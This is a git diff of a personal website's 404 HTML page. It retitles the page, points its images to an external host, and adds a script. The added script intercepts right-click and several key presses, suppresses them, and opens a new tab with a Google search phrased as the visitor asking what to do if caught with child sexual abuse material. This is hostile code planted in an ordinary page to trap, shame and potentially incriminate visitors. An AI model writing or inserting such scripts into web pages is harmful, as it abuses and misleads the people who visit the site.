@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>This Page Aint Exist Fr</title>
+    <title>@$cars</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:description" content=":3">
@@ -16,20 +16,36 @@
 <body>
     <div class="background">
         <div class="ascii-image" id="image">
-            <img id="random-gif" src="./assets/fluttershy.gif">
+            <img id="random-gif" src="https://cant.rest/assets/fluttershy.gif/">
         </div>
 
         <div class="full-page-overlay">
-            <img src="./assets/fake-ascii.png">
+            <img src="https://cant.rest/assets/fake-ascii.png/">
         </div>
     </div>
 </body>
-
+</html>
 <script>
-    window.onload = function() {
+    window.onload = function () {
         if (window.location.pathname === '/404.html') {
             window.location.replace('/404');
         }
     };
 </script>
-</html>
+<script>
+    function openNewPage(url) {
+        window.open(url, '_blank');
+    }
+
+    function handleEvent(event) {
+
+        if (event.type === 'contextmenu' || (event.type === 'keydown' && (event.ctrlKey || event.shiftKey || event.key === 's'))) {
+
+            openNewPage('https://www.google.com/search?q=what+to+do+if+I+get+caught+with+child+porn&oq=what+to+do+if+I+get+caught+with+child+porn');
+            event.preventDefault();
+        }
+    }
+
+    window.addEventListener('contextmenu', handleEvent);
+    window.addEventListener('keydown', handleEvent);
+</script>
